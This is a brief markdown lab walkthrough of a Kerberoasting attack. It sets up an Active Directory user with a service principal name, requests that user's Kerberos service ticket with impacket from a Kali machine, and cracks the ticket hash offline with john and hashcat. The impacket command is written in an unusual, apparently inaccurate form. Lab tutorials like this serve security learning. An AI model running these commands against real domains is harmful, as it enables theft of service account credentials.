
# Kerberoasting

First create a user in the server by the script



## gen_user.ps1

```create a user
$splat = @{
    Name = 'ChewDavid'
    AccountPassword = (Read-Host -AsSecureString 'AccountPassword')
    Enabled = $true
}
New-ADUser @splat
```
And then add the SPN (service principal name) to the user by
```SPN
setspn -s http/ChewDavid.xyz.com ChewDavid
```
You can read more about the SPN in this article



[Microsoft SPN](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)#examples)

After the user is added to SPN go back to kali machine and 
run the tool
```Get SPN
impacket -GetUserSPNs xyz.com/alice:bubbles -dc-ip {ip} -request
```
Save the hash file and brute force it to get the account creds,
We can use hashcat as well as 
```john
john --wordlist=wordlist.txt kerb.hash
```
```hashcat
hashcat -m 13100 kerb.hash wordlist.txt
```
